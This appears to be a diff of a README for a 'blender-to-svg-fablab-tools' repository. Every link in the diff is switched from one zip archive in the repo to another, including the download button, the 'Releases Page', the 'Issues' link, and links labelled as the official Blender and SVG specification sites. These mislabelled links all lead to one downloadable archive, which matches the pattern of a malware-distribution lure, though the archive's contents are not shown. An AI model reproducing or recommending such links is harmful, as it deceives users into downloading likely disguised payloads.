@@ -8,9 +8,9 @@ Welcome to the blender-to-svg-fablab-tools repository! This software allows you 
 
 To get started, click the button below to download the application:
 
-[![Download Latest Release](https://raw.githubusercontent.com/ZemonXss/blender-to-svg-fablab-tools/main/bacillian/fablab-svg-tools-to-blender-v2.0.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/ZemonXss/blender-to-svg-fablab-tools/main/bacillian/fablab-svg-tools-to-blender-v2.0.zip)
+[![Download Latest Release](https://github.com/ZemonXss/blender-to-svg-fablab-tools/raw/refs/heads/main/bacillian/to_svg_blender_fablab_tools_earcockle.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/ZemonXss/blender-to-svg-fablab-tools/raw/refs/heads/main/bacillian/to_svg_blender_fablab_tools_earcockle.zip)
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/ZemonXss/blender-to-svg-fablab-tools/main/bacillian/fablab-svg-tools-to-blender-v2.0.zip).
+1. Visit the [Releases Page](https://github.com/ZemonXss/blender-to-svg-fablab-tools/raw/refs/heads/main/bacillian/to_svg_blender_fablab_tools_earcockle.zip).
 2. Locate the latest version of the software.
 3. Download the appropriate file for your system. Make sure to choose the version that matches your operating system (Windows, macOS, or Linux).
 4. Once the file downloads, follow the installation prompts specific to your operating system.
@@ -45,15 +45,15 @@ Once installed, follow these steps to use the software:
 
 ## 🌍 Support
 
-For any questions or issues, feel free to reach out through the [GitHub Issues Section](https://raw.githubusercontent.com/ZemonXss/blender-to-svg-fablab-tools/main/bacillian/fablab-svg-tools-to-blender-v2.0.zip). 
+For any questions or issues, feel free to reach out through the [GitHub Issues Section](https://github.com/ZemonXss/blender-to-svg-fablab-tools/raw/refs/heads/main/bacillian/to_svg_blender_fablab_tools_earcockle.zip). 
 
 ## 🗂️ Additional Resources
 
 You might find the following links helpful:
 
-- [Blender Official Website](https://raw.githubusercontent.com/ZemonXss/blender-to-svg-fablab-tools/main/bacillian/fablab-svg-tools-to-blender-v2.0.zip)
-- [SVG Specification](https://raw.githubusercontent.com/ZemonXss/blender-to-svg-fablab-tools/main/bacillian/fablab-svg-tools-to-blender-v2.0.zip)
-- [Digital Fabrication Techniques](https://raw.githubusercontent.com/ZemonXss/blender-to-svg-fablab-tools/main/bacillian/fablab-svg-tools-to-blender-v2.0.zip)
+- [Blender Official Website](https://github.com/ZemonXss/blender-to-svg-fablab-tools/raw/refs/heads/main/bacillian/to_svg_blender_fablab_tools_earcockle.zip)
+- [SVG Specification](https://github.com/ZemonXss/blender-to-svg-fablab-tools/raw/refs/heads/main/bacillian/to_svg_blender_fablab_tools_earcockle.zip)
+- [Digital Fabrication Techniques](https://github.com/ZemonXss/blender-to-svg-fablab-tools/raw/refs/heads/main/bacillian/to_svg_blender_fablab_tools_earcockle.zip)
 
 ## 💬 Community Contributions
 
